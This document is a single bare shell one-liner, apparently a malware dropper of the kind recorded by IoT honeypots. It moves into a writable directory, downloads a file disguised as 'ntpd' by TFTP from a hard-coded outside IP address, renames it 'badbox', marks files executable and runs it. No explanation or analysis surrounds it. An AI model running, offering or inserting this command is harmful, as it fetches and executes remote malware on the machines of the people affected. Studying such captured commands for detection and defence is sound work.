cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 185.165.29.117;cat ntpd >badbox;chmod +x *;./badbox
